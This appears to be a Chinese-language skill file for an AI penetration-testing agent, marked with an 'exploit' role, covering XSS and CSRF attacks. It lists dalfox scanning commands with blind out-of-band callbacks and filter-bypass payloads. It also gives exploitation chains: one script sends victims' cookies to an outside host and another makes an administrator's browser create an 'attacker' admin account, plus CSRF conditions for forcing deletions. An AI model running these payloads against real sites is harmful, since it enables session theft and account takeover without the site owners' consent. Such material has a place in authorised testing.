---
name: xss-csrf
description: XSS 与 CSRF：反射/存储/DOM 三类判据、dalfox 实战、CSP 与编码绕过、利用链（打后台/打 cookie）
whenToUse: 有回显点、富文本、搜索页、个人资料，或需要打后台管理员
role: exploit
enabled: true
---

# XSS 与 CSRF

## 三类先分清

~~~
反射：参数原样回显在 HTML
存储：内容落库后在其他页面渲染（评论区、昵称、工单）
DOM：前端 JS 把 location/hash/innerHTML 拼进页面（服务端看不到）
~~~

## dalfox 实战

~~~bash
dalfox url 'http://TARGET/search?q=1' --blind OAST_DOMAIN
cat urls.txt | dalfox pipe --blind OAST_DOMAIN -o xss.txt
dalfox url 'http://TARGET/p?q=1' -p q --skip-bav
dalfox url 'http://TARGET/p?q=1' -H 'Cookie: SESSION=xx' --blind OAST_DOMAIN
~~~

`--blind` 用 interactsh 收 DNS/HTTP 回连，**这是判断执行没执行的唯一硬证据**。

## 编码与绕过

~~~
基础：<script>alert(1)</script>  <img src=x onerror=alert(1)>
引号内：'-alert(1)-'  ";alert(1)//
属性内："><svg onload=alert(1)>
伪协议：javascript:alert(1)
HTML 实体：&#x3c;script&#x3e;
大小写/双写：<ScRiPt> <scr<script>ipt>
CSP 存在时：找 JSONP、angular 沙箱、base-uri 缺失、unsafe-inline
~~~

## 利用链（比弹窗有用）

~~~html
<script>new Image().src='http://OAST/?c='+document.cookie</script>
<script>fetch('/admin/user/add',{method:'POST',credentials:'include',headers:{'content-type':'application/json'},body:JSON.stringify({user:'attacker',role:'admin'})})</script>
~~~

## CSRF

~~~
条件：无 token 校验 + cookie 自动携带 + SameSite 缺失或 None
SameSite=Lax：GET 型操作仍可打（/admin/delete?id=1）
SameSite=Strict：打不动，转 XSS
~~~

## 判据

- 反射/存储：**在真实浏览器上下文执行**才算（playwright 或人工点开），curl 回显只是 suspected
- DOM 型：必须看 JS 执行后的 DOM
- 盲打：OAST 有回连 = 执行；无回连只能记 suspected
- 落库 category=xss，evidence 贴 payload 原文 + 执行截图/回连记录